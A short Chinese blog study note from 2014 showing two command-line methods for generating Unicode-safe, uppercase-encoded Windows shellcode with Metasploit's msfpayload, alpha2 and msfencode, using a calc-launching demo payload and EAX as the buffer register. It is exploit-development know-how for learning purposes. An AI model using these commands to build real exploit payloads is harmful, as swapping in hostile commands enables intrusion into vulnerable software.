title: "生成unicode shellcode"
date: 2014-01-14 14:02:33
tags:
id: 483
comment: false
categories:
  - 学习笔记
---

方法一：

msfpayload windows/exec CMD=calc R &gt; ./test.raw

alpha2 eax --unicode --uppercase &lt; ./test.raw  #其中eax是指向shellcode的第一字符的寄存器

方法二：

msfpayload windows/exec CMD=calc R | msfencode -e x86/unicode_upper BufferRegister=EAX -t python #其中eax是指向shellcode的第一字符的寄存器

&nbsp;